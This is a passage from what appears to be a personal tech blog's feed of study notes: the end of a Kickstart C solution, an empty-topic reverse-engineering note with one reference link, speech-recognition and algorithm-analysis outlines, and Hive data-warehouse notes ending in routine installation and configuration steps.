&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">8 2</span></span><br><span class="line"><span class="comment">GOO</span></span><br><span class="line"><span class="comment">GO</span></span><br><span class="line"><span class="comment">ART</span></span><br><span class="line"><span class="comment">ART</span></span><br><span class="line"><span class="comment">GOOO</span></span><br><span class="line"><span class="comment">AT</span></span><br><span class="line"><span class="comment">PPPP</span></span><br><span class="line"><span class="comment">OOO</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> problem </category>
          
      </categories>
      
      
        <tags>
            
            <tag> problem </tag>
            
            <tag> google </tag>
            
            <tag> kickstart </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>脱壳破解笔记</title>
      <link href="/blog/note-crack/"/>
      <url>/blog/note-crack/</url>
      
        <content type="html"><![CDATA[<p>搭配计算机组成原理食用更佳</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://www.52pojie.cn/thread-327415-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-327415-1-1.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hack </tag>
            
            <tag> note </tag>
            
            <tag> crack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度学习自然语言处理笔记</title>
      <link href="/blog/note-deep-learning-for-human-language-processing/"/>
      <url>/blog/note-deep-learning-for-human-language-processing/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><h2 id="Speech-Recognition"><a href="#Speech-Recognition" class="headerlink" title="Speech Recognition"></a>Speech Recognition</h2><h3 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h3><ul><li>Phoneme: a unit of sound.</li><li>Grapheme: smallest unit of a writing system.</li><li>Word: For some languages, V can be too large!</li><li>Morpheme: the smallest meaningful unit.(&lt; word, &gt; grapheme) Eg. unbreakable-&gt;un, break, able<br>linguistic or statistic</li><li>Bytes: The system can be language independent!</li></ul><h3 id="Acoustic-Feature"><a href="#Acoustic-Feature" class="headerlink" title="Acoustic Feature"></a>Acoustic Feature</h3><h3 id="LAS-Model"><a href="#LAS-Model" class="headerlink" title="LAS Model"></a>LAS Model</h3><p>LAS = Listen, Attend, and Spell</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>《深度学习人类语言处理(Deep Learning for Human Language Processing (2020,Spring))》，李宏毅，2020，<a href="http://speech.ee.ntu.edu.tw/~tlkagk/courses_DLHLP20.html" target="_blank" rel="noopener">http://speech.ee.ntu.edu.tw/~tlkagk/courses_DLHLP20.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> machine-learnning </tag>
            
            <tag> NLP </tag>
            
            <tag> speech-recognition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法设计与分析笔记bp</title>
      <link href="/blog/note-algorithm-bp/"/>
      <url>/blog/note-algorithm-bp/</url>
      
        <content type="html"><![CDATA[<p>日常疑问：我还用学吗？<br>——20200312</p><hr><p>还需要233，重新看下算导吧<br>——20200322</p><hr><h1 id="算法设计基础"><a href="#算法设计基础" class="headerlink" title="算法设计基础"></a>算法设计基础</h1><h2 id="1-1-算法设计基础"><a href="#1-1-算法设计基础" class="headerlink" title="1.1 算法设计基础"></a>1.1 算法设计基础</h2><h3 id="1-1-2-算法及其重要特性"><a href="#1-1-2-算法及其重要特性" class="headerlink" title="1.1.2 算法及其重要特性"></a>1.1.2 算法及其重要特性</h3><p>算法是对特定问题求解步骤的一种描述，是指令的有限序列，必须满足以下五大特性：</p><ul><li>输 入：一个算法有零个或多个输入。</li><li>输 出：一个算法有一个或多个输出。</li><li>有穷性：一个算法必须总是在执行有穷步之后结束，且每一步都在有穷时间内完成。</li><li>确定性：算法中的每一条指令必须有确切的含义，对于相同的输入只能得到相同的输出。</li><li>可行性：算法描述的操作可以通过已经实现的基本操作执行有限次来实现。</li></ul><p>程序</p><ul><li>程序=算法+数据结构</li><li>程序是算法用某种程序设计语言的具体实现，但程序可以不满足算法的性质，即有穷性。</li></ul><p>好算法的重要特性</p><ul><li>正确性</li><li>健壮性</li><li>可理解性</li><li>抽象分级</li><li>高效性</li></ul><h3 id="1-1-3-算法的描述"><a href="#1-1-3-算法的描述" class="headerlink" title="1.1.3 算法的描述"></a>1.1.3 算法的描述</h3><ol><li>自然语言</li><li>流程图</li><li>程序设计语言</li><li>伪代码</li></ol><h3 id="1-1-4-算法设计一般过程"><a href="#1-1-4-算法设计一般过程" class="headerlink" title="1.1.4 算法设计一般过程"></a>1.1.4 算法设计一般过程</h3><ol><li>理解问题</li><li>预测所有可能的输入</li><li>在精确解和近似解间做出选择</li><li>确定适当的数据结构</li><li>算法设计技术</li><li>描述算法</li><li>跟踪算法</li><li>分析算法效率</li><li>根据算法编写代码</li></ol><h1 id="算法分析基础"><a href="#算法分析基础" class="headerlink" title="算法分析基础"></a>算法分析基础</h1><h2 id="2-1-算法的复杂度"><a href="#2-1-算法的复杂度" class="headerlink" title="2.1 算法的复杂度"></a>2.1 算法的复杂度</h2><ul><li>算法的核心和灵魂是效率，也就是求解速度，与算法的复杂性存在密切关系</li><li>计算机中最重要的两种资源是时间和空间资源。更确切的说，算法的复杂性是算法运行所需要的计算机资源的量，需要的时间资源的量称为时间复杂性，需要的空间资源的量称为空间复杂性。</li></ul><h3 id="2-1-1-输入规模与基础语句"><a href="#2-1-1-输入规模与基础语句" class="headerlink" title="2.1.1 输入规模与基础语句"></a>2.1.1 输入规模与基础语句</h3><ul><li>输入规模：指输入量的多少</li><li>基础语句<ul><li>精确地表示算法的运行时间函数T(n)常常是很困难的，考虑到算法分析的主要目的在于比较求解同一个问题的不同算法效率精简客观地反映一个算法的运行时间，用算法中基本语句的执行次数来度量算法的工作量。 ٭</li><li>基本语句：执行次数与整个算法的执行次数成正比的语句，对算法运行时间贡献最大，是算法中最重要的操作</li></ul></li></ul><h3 id="2-1-2-算法的渐进分析"><a href="#2-1-2-算法的渐进分析" class="headerlink" title="2.1.2 算法的渐进分析"></a>2.1.2 算法的渐进分析</h3><ul><li>算法的渐进分析并不是度量算法的时间量，而是度量算法运行时间的增长趋势。换言之，只考察当输入规模充分大时，算法中基本语句的执行次数在渐近意义下的上界，常用大（读欧）O表示。</li><li>定义2.1 若存在两个正常数$c$和$n_0$ ，对于任意$n\geqslant n_0$，都有$T(n)\leqslant c\times f(n)$，就称函数$T(n)＝O(f(n))$。</li><li>注：大$O$符号描述增长率的上限，表示表示$T(n)$的增长最多像$f(n)$增长的那样快。</li></ul><p>重新看了一下算导，$\Theta(g(n))$是渐进紧确界，$O(g(n))$是渐进上界，$\Omega(g(n))$是渐进下界</p><h3 id="2-1-3-最好、最坏和平均情况"><a href="#2-1-3-最好、最坏和平均情况" class="headerlink" title="2.1.3 最好、最坏和平均情况"></a>2.1.3 最好、最坏和平均情况</h3><p>时间复杂性与输入数据的关联性<br>有些算法的时间代价只依赖于问题的输入规模，而与输入的具体数据无关。<br>但有些算法，即使输入规模相同，如果输入数据不同，其时间代价也不相同。<br>如果问题规模相同，时间代价与输入数据有关，则需要分析最好情况、最坏情况、平均情况。</p><h3 id="2-1-5-递归算法的时间复杂性分析"><a href="#2-1-5-递归算法的时间复杂性分析" class="headerlink" title="2.1.5 递归算法的时间复杂性分析"></a>2.1.5 递归算法的时间复杂性分析</h3><p>递归算法时间复杂性分析的关键：根据递归过程建立递推关系式，然后求解<br>通用分治递推式</p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hive笔记</title>
      <link href="/blog/note-hive/"/>
      <url>/blog/note-hive/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction-to-Hive"><a href="#Introduction-to-Hive" class="headerlink" title="Introduction to Hive"></a>Introduction to Hive</h2><h3 id="Difference-between-SQL-and-NoSQL"><a href="#Difference-between-SQL-and-NoSQL" class="headerlink" title="Difference between SQL and NoSQL"></a>Difference between SQL and NoSQL</h3><p><img src="/img/note-hive/20200311100017.png" alt></p><ul><li>SQL<br>Relational, Analytical(OLAP)</li><li>NoSQL<br>Document, Key-Value, Column-Family, Graph</li></ul><h3 id="What-is-Hive"><a href="#What-is-Hive" class="headerlink" title="What is Hive"></a>What is Hive</h3><ul><li><p>It is an open-source data warehouse system for querying and analyzing large data set stored in HDFS.<br>它是一个开源数据仓库系统，用于查询和分析存储在HDFS中的大数据集。</p></li><li><p>Its highly scalable.<br>其高度可扩展性。</p></li><li><p>Hive uses HQL(Hive + SQL) for data summarization, querying and analysis.<br>Hive使用HQL（Hive + SQL）进行数据汇总，查询和分析。</p></li><li><p>HQL will be converted into map reduce jobs by the Hive component.<br>Hive组件将把HQL转换为map reduce作业</p></li></ul><h3 id="Who-developed-Hive"><a href="#Who-developed-Hive" class="headerlink" title="Who developed Hive"></a>Who developed Hive</h3><ul><li><p>Hive was originally developed by Facebook and is now maintained as Apache hive by Apache software foundation.<br>Hive最初由Facebook开发，现在由Apache软件基金会维护为Apache hive。</p></li><li><p>It is used and developed by biggies such as Netflix and Amazon as well.<br>它也由Netflix和Amazon等大型公司使用和开发</p></li></ul><h3 id="Why-Hive-was-developed"><a href="#Why-Hive-was-developed" class="headerlink" title="Why Hive was developed?"></a>Why Hive was developed?</h3><ul><li><p>Traditional organization uses data warehouses that are based on SQL, with users and developers that rely on SQL queries for extracting data.<br>传统组织使用基于SQL的数据仓库，而用户和开发人员则依赖SQL查询来提取数据。</p></li><li><p>The Hadoop ecosystem is not just scalable but also cost effective when it comes to processing large volumes of data.<br>Hadoop生态系统不仅具有可扩展性，而且在处理大量数据时也具有成本效益。</p></li><li><p>It makes getting used to the Hadoop ecosystem an uphill task. And that is exactly why hive was developed.<br>这使习惯Hadoop生态系统成为一项艰巨的任务。这就是开发Hive的原因。</p></li><li><p>Hive provides SQL intellect, so that users can write SQL like queries called HQL or hive query language to extract the data from Hadoop.<br>Hive提供了SQL知识，因此用户可以编写类似HQL的查询之类的SQL或Hive查询语言来从Hadoop提取数据。</p></li></ul><h3 id="How-and-when-it-can-be-used"><a href="#How-and-when-it-can-be-used" class="headerlink" title="How and when it can be used?"></a>How and when it can be used?</h3><ul><li><p>Hive can be used for OLAP (online analytic) processing.<br>Hive可用于OLAP（在线分析）处理。</p></li><li><p>It is scalable, fast and flexible.<br>它具有可扩展性，快速性和灵活性。</p></li><li><p>It is a great platform for the SQL users to write SQL like queries to interact with the large datasets that reside on HDFS filesystem.<br>对于SQL用户而言，这是一个很棒的平台，可以编写类似于查    询的SQL来与驻留在HDFS文件系统上的大型数据集进行交互</p></li></ul><h3 id="When-Hive-cannot-be-used"><a href="#When-Hive-cannot-be-used" class="headerlink" title="When Hive cannot be used?"></a>When Hive cannot be used?</h3><ul><li>It is not a relational database.</li><li>It cannot be used fir OLTP(online transaction) processing.</li><li>It cannote be used for real time updates or queries.</li><li>It cannot be used for scenarios where low latency data retrieval is expected, because there is sa latency in converting the HIVE scripts into MAP REDUCE scripts by Hive.</li></ul><h3 id="Features-of-Hive"><a href="#Features-of-Hive" class="headerlink" title="Features of Hive"></a>Features of Hive</h3><ul><li><p>It supports different file formats like sequence file, text file, avro file format, ORC file, RC file.<br>它支持不同的文件格式，例如序列文件，文本文件，avro文件格式，    ORC文件，RC文件。</p></li><li><p>Metadata gets stored in RDBMS like derby database.<br>元数据像derby数据库一样存储在RDBMS中。</p></li><li><p>Hive provides lot of compression techniques, queries on the compressed data such as SNAPPY compression, gzip compression.<br>Hive提供了许多压缩技术，可以对压缩数据进行查询，例如SNAPPY    压缩，gzip压缩。</p></li><li><p>Users can write SQL like queries that hive converts into mapreduce or tez or spark jobs to query against hadoop datasets.<br>用户可以编写类似查询的SQL，将配置单元转换为mapreduce或tez或    spark作业，以针对hadoop数据集进行查询。</p></li><li><p>Users can plugin mapreduce scripts into the hive queries using UDF user defined functions.<br>用户可以使用UDF用户定义的函数将mapreduce脚本插入到配置单元    查询中。</p></li><li><p>Specialized joins are available that help to improve the query performance.<br>可以使用专用联接来帮助提高查询性能</p></li></ul><h3 id="Difference-between-Hive-amp-RDBMS"><a href="#Difference-between-Hive-amp-RDBMS" class="headerlink" title="Difference between Hive &amp; RDBMS"></a>Difference between Hive &amp; RDBMS</h3><p><img src="/img/note-hive/20200311102124.png" alt></p><h2 id="Hive-Chapter-1"><a href="#Hive-Chapter-1" class="headerlink" title="Hive Chapter 1"></a>Hive Chapter 1</h2><h3 id="What-is-Hive-1"><a href="#What-is-Hive-1" class="headerlink" title="What is Hive?"></a>What is Hive?</h3><ul><li>HIVE is a data warehouse architecture built on the Hadoop file system.<br>HIVE是一个建立在Hadoop文件系统上的数据仓库架构。</li><li>HIVE analyzes and manages the data stored in HDFS.<br>HIVE分析和管理存储在HDFS中的数据。                </li><li>It mainly provides the following functions:主要提供以下功能:<br>Provides a series of tools for extracting / transforming / loading data (ETL)<br>提供了一系列用于提取/转换/加载数据(ETL)的工具</li><li>Is a mechanism that can store, query, and analyze large-scale data stored in HDFS (or HBase)<br>是一种可以存储、查询和分析储存于HDFS(或HBase)中的大规模数据的机制</li><li>The query is done through MapReduce (not all queries require MapReduce to complete, such as <code>select * from XXX</code> is not required;<br>查询是通过MapReduce完成的(并不是所有的查询都需要MapReduce来完成，例如从XXX中选择<code>select *</code>是不需要的);</li><li>In Hive, queries like <code>select a, b from XXX</code> can be configured without MapReduce through configuration.<br>在Hive中，像从XXX中选择<code>a, b</code>这样的查询可以在没有MapReduce的情况下通过配置进行配置。</li></ul><h3 id="How-to-analyze-and-manage-data-如何分析和管理数据"><a href="#How-to-analyze-and-manage-data-如何分析和管理数据" class="headerlink" title="How to analyze and manage data? 如何分析和管理数据?"></a>How to analyze and manage data? 如何分析和管理数据?</h3><ul><li>Hive defines a SQL-like query language called HQL.<br>Hive定义了一种类似SQL的查询语言，称为HQL。</li><li>Hive can be used to query data directly.<br>Hive可以用于直接查询数据。</li><li>At the same time, the language also allows developers to develop custom mappers and reducers to handle complex analysis tasks that the built-in mappers and reducers cannot complete.<br>与此同时，该语言还允许开发人员开发定制的Mappers和Reducers来处理内置的Mappers和Reducers无法完成的复杂分析任务。</li><li>Hive allows users to write their own function UDFs.<br>Hive允许用户编写自己的函数UDFs。</li><li>There are three types of UDFs in Hive: 在Hive中有三种类型的UDFs:<ul><li>User Defined Functions (UDF) 用户定义函数(UDF)</li><li>User Defined Aggregation Functions (UDAF) 用户定义聚合函数(UDAF)</li><li>User Defined Table Generating Functions (UDTF). 用户定义的表生成函数(UDTF)</li></ul></li><li>Hive parses external tasks into a MapReduce executable plan. MapReduce is a high-latency event.<br>Hive将外部任务解析为MapReduce可执行计划。MapReduce是一个高延迟的事件。</li><li>Each submission and execution of a task takes a lot of time, which determines that Hive can only handle some high-latency application.<br>任务的每次提交和执行都需要大量的时间，这决定了Hive只能处理一些高延迟的应用程序</li><li>Hive currently has the following disadvantages： 目前Hive有以下缺点:<ul><li>Hive does not  support transactions; Hive不支持交易;</li><li>Table data cannot be modified 无法修改表数据</li><li>Columns cannot be indexed 列不能被索引</li></ul></li></ul><h3 id="HIVE-Data-Storage-Model-HIVE数据存储模型"><a href="#HIVE-Data-Storage-Model-HIVE数据存储模型" class="headerlink" title="HIVE Data Storage Model.  HIVE数据存储模型"></a>HIVE Data Storage Model.  HIVE数据存储模型</h3><p>HIVE data is divided into :   Hive数据分为：</p><ul><li>Table data : Table data is the data that tables in Hive have<br>表数据: 表数据是Hive中的表所拥有的数据</li><li>Metadata : Metadata is used to store the data about the table.<br>元数据: 元数据用于存储关于表的数据。</li></ul><h3 id="HIVE-Data-Storage-Hive数据存储"><a href="#HIVE-Data-Storage-Hive数据存储" class="headerlink" title="HIVE Data Storage. Hive数据存储"></a>HIVE Data Storage. Hive数据存储</h3><ul><li>Hive is based on the Hadoop distributed file system.<br>Hive是基于Hadoop分布式的文件系统</li><li>HIVE data is stored in the Hadoop distributed file system.<br>Hive数据存储在Hadoop分布式文件系统中</li><li>We  only need to specify  the column and row separators in the data when we  create the table.<br>我们只需要在创建表时指定数据中的列和行分隔符。</li><li>Hive can parse the data.<br>Hive可以解析数据。</li><li>Importing  HDFS data into a Hive table is simply moving the data to the directory where the table is located.<br>将HDFS数据导入到Hive表中只是将数据移动到表所在的目录中。</li><li>The data in the local file system, need to copy in the same directory of the table.<br>数据在本地文件系统中，需要复制在相同目录下的表。</li></ul><h3 id="Hive-Data-Models-Table-Hive-数据模型-Table"><a href="#Hive-Data-Models-Table-Hive-数据模型-Table" class="headerlink" title="Hive Data Models-Table. Hive 数据模型-Table"></a>Hive Data Models-Table. Hive 数据模型-Table</h3><ul><li>Tables in Hive are similar in concept to tables in relational databases.<br>Hive中的表在概念上与关系数据库中的表相似。</li><li>Each table has a corresponding directory in HDFS to store the table’s data.<br>每个表在HDFS中都有一个对应的目录来存储表的数据。</li><li>This directory can be accessed through <code>$ {HIVE_HOME} / conf / hive-site</code>.<br>可以通过<code>$ {HIVE_HOME} / conf / hive-site</code> 访问这个目录。</li><li>The <code>hive.metastore.warehouse.dir</code> property in the xml configuration file is used to configure.<br><code>hive.metastore.warehouse.dir</code> 属性在xml配置文件中进行配置。</li><li>The default value of this property is <code>/ user / hive / warehouse</code> (this directory is on HDFS).         此属性的默认值是<code>/ user / hive / warehouse</code>(此目录位于HDFS上)。</li><li>We can modify this configuration according to requirement.<br>我们可以根据需要修改这个配置。</li></ul><h3 id="Hive-Data-Models-External-Table-Hive-数据模型"><a href="#Hive-Data-Models-External-Table-Hive-数据模型" class="headerlink" title="Hive Data Models-External Table. Hive 数据模型"></a>Hive Data Models-External Table. Hive 数据模型</h3><ul><li>The external table in HIVE is very similar to the table, but its data is not stored in the directory to which the table belongs but stored elsewhere.<br>HIVE中的external table(外部表)与该表非常相似，但是它的数据不是存储在该表所属的目录中，而是存储在其他地方。</li><li>If we delete the data of external table, the data pointed to by the external table is not  deleted, it deletes the metadata corresponding to the external table<br>如果我们删除了外部表的数据，external table(外部表)指向的数据并没有被删除，它删除了与external table(外部表)对应的元数据</li><li>If we want to delete the table, all the data corresponding to the table including the metadata will be deleted.<br>如果要删除该表，则删除该表所对应的所有数据，包括元数据。</li></ul><h3 id="Hive-Data-Models-Partition-Hive-数据模型-Partition"><a href="#Hive-Data-Models-Partition-Hive-数据模型-Partition" class="headerlink" title="Hive Data Models-Partition. Hive 数据模型-Partition"></a>Hive Data Models-Partition. Hive 数据模型-Partition</h3><ul><li>In Hive, each partition of the table corresponds to the respective  directory under the table, and the data of all partitions is stored in the corresponding directory.<br>在Hive中，表的每个分区对应于表下的各个目录，所有partitions(分区)的数据都    存储在相应的目录中。</li></ul><h3 id="Hive-Data-Models-Bucket-Hive-数据模型-Bucket"><a href="#Hive-Data-Models-Bucket-Hive-数据模型-Bucket" class="headerlink" title="Hive Data Models-Bucket. Hive 数据模型-Bucket"></a>Hive Data Models-Bucket. Hive 数据模型-Bucket</h3><ul><li>Calculate the hash of the specified column and slice the data according to the hash value.<br>指定列计算 hash，并根据 hash 值切分数据。</li><li>The purpose is to parallelize each bucket corresponding to a file<br>其目的是将每个Bucket(桶)对应于一个文件并行化</li></ul><h3 id="Hive-MetaData"><a href="#Hive-MetaData" class="headerlink" title="Hive MetaData"></a>Hive MetaData</h3><ul><li>The metadata in Hive includes the name of the table, the columns and partitions of the table and their attributes<br>Hive中的元数据包括表的名称、列和表的partitions(分区)以及它们的属性</li><li>HIVE metadata needs to be constantly updated and modified.<br>HIVE元数据需要不断更新和修改。</li><li>Files in the HDFS system are available for read operation more and does not support frequent  modification, hence we  cannot store Hive’s metadata in HDFS.<br>HDFS系统中的文件可用于更多的读取操作，不支持频繁的修改，因此我们不能将Hive的元数据存储在HDFS中。</li><li>Currently Hive stores metadata in databases, such as Mysql and Derby.<br>目前Hive将元数据存储在数据库中，如MySQL和Derby。</li></ul><h3 id="Hive-Storage-model"><a href="#Hive-Storage-model" class="headerlink" title="Hive Storage model"></a>Hive Storage model</h3><p><img src="/img/note-hive/202003121535.png" alt></p><h3 id="Database-Model"><a href="#Database-Model" class="headerlink" title="Database Model"></a>Database Model</h3><p>The ACID acronym stands for:</p><ul><li>Atomic<br>All operations in a transaction succeed or every operation is rolled back.</li><li>Consistent<br>On the completion of a transaction, the database is structurally sound.</li><li>Isolated<br>Transactions do not contend with one another. Contentious access to data is moderated by the database so that transactions appear to run sequentially.</li><li>Durable<br>The results of applying a transaction are permanent, even in the presence of failures.</li></ul><p>ACID properties mean that once a transaction is complete, its data is consistent (tech lingo: write consistency) and stable on disk, which may involve multiple distinct memory locations.</p><p>Write consistency is a wonderful thing for application developers, but it also requires sophisticated locking which is typically a heavyweight pattern for most use cases.<br>When it comes to NoSQL technologies, most graph databases(including Neo4j) use an ACID consistency model to ensure data is safe and consistently stored.</p><p>Here’s how the BASE acronym breaks down:</p><ul><li>Basic Availability<br>The database appears to work most of the time.</li><li>Soft-state<br>Stores don’t have to be write-consistent, nor do different replicas have to be mutually consistent all the time.</li><li>Eventual consistency</li></ul><p>Stores exhibit consistency at some later point (e.g., lazily at read time).<br>BASE properties are much looser than ACID guarantees, but there isn’t a direct one-for-one mapping between the two consistency models (a point that probably can’t be overstated).</p><p>A BASE data store values availability (since that’s important for scale), but it doesn’t offer guaranteed consistency of replicated data at write time. Overall, the BASE consistency model provides a less strict assurance than ACID: data will be consistent in the future, either at read time (e.g., Riak) or it will always be consistent, but only for certain processed past snapshots (e.g., Datomic).</p><p>The BASE consistency model is primarily used by aggregate stores, including column family, key-value and document stores.</p><h3 id="Hive-Installation"><a href="#Hive-Installation" class="headerlink" title="Hive Installation"></a>Hive Installation</h3><h4 id="基于Derby"><a href="#基于Derby" class="headerlink" title="基于Derby"></a>基于Derby</h4><ol><li>下载<br><a href="https://mirrors.tuna.tsinghua.edu.cn/apache/hive/hive-1.2.2/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/apache/hive/hive-1.2.2/</a></li><li>将文件传到Linux <code>/home/hadoop/Download</code></li><li>解压<br>到<code>~/Download</code>目录下找到文件，<code>tar -zvxf apache-hive-1.2.2-bin.tar.gz -C ~/app/</code></li><li><code>vi ~/.bash_profile</code>在最后添加两行<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HIVE_HOME=/home/hadoop/app/apache-hive-1.2.2-bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$HIVE_HOME</span>/bin</span><br></pre></td></tr></table></figure></li></ol><p>最后<code>source ~/.bash_profile</code></p><ol><li>输入<code>hive --version</code>查看是否安装成功</li><li><p>开启hadoop <code>start-all.sh</code><br>运行下面的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hdfs dfs -mkdir -p /user/hive/warehouse</span><br><span class="line">hdfs dfs -mkdir  /user/hive/tmp</span><br><span class="line">hdfs dfs -mkdir  /user/hive/<span class="built_in">log</span></span><br><span class="line">hdfs dfs -chmod g+w /user/hive/warehouse</span><br><span class="line">hdfs dfs -chmod g+w /user/hive/tmp</span><br><span class="line">hdfs dfs -chmod g+w /user/hive/<span class="built_in">log</span></span><br></pre></td></tr></table></figure></li><li><p>然后去<code>/home/hadoop/app/apache-hive-1.2.2-bin/conf</code>copy一下模板修改<code>hive-site.xml</code>和<code>hive-env.sh</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp hive-env.sh.template hive-env.sh</span><br><span class="line">cp hive-default.xml.template hive-default.xml</span><br></pre></td></tr></table></figure></li></ol><p>在<code>hive-env.sh</code>中添加<code>vi hive-env.sh</code><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HADOOP_HOME=/home/hadoop/app/hadoop-2.7.3</span><br><span class="line"><span class="built_in">export</span> HIVE_CONF_DIR=/home/hadoop/app/apache-hive-1.2.2-bin/conf</span><br><span class="line"><span class="built_in">export</span> HIVE_AUX_JARS_PATH=/home/hadoop/app/apache-hive-1.2.2-bin/lib</span><br></pre></td></tr></table></figure></p><p>新建<code>hive-site.xml</code>添加<code>vi hive-site.xml</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.warehouse.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/user/hive/warehouse<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.exec.scratdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/user/hive/tmp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.querylog.location<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/user/hive/log<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionURL<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>jdbc:derby:;databaseName=/home/hadoop/app/apache-hive-1.2.2-bin/metastore_db;create=true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionDriverName<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.derby.jdbc.EmbeddedDriver<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.PersistenceManagerFactoryClass<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.datanucleus.api.jdo.JDOPersistenceManagerFactory<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>system:java.io.tmpdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/user/hive/tmp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p><ol><li><p>初始化数据库<br><code>schematool -initSchema -dbType derby</code></p></li><li><p>加权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chgrp -R hadoop /user/hive/</span><br><span class="line">sudo chown -R hadoop 